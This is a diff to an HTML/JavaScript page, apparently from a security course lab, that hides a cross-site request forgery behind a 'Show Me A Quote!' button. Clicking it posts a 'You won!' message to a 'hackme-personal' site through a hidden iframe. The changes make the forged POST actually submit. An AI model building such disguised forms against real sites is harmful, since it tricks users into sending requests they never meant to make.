@@ -88,13 +88,13 @@ body{
       <!--end quoteContainer-->
 
       <div id="buttonContainer">
-        <form target="dummyframe" action="http://infosec-020-105/hackme-personal/post.php" id="submission" method="post">
+        <form target="myframe" action="http://infosec-020-105/hackme-personal/post.php" id="submission" method="post">
 						<input name="post_submit" value="set" type="hidden">
 						<input name="title" value="You won!" type="hidden">
 						<input name="message" value="You have been selected for a free flying dragon ride." type="hidden">
             <input id="quoteButton" name="post_submit" type="submit" value="Show Me A Quote!">
-					<iframe src="http://infosec-020-105/hackme-personal/post.php?" style="display: none;" name="dummyframe" id="dummyframe"></iframe>
         </form>
+				<iframe src="http://infosec-020-105/hackme-personal/post.php?" style="display: none;" name="myframe" id="myframe"></iframe>
       </div>
       <!--end buttonContainer-->
 
@@ -106,7 +106,8 @@ body{
 //But eh. It works. :P
   $('#submission').submit(function(event) {
       // submit the form
-      event.preventDefault();
+      //event.preventDefault();
+			return true;
   });
 
     $(document).ready(function(){
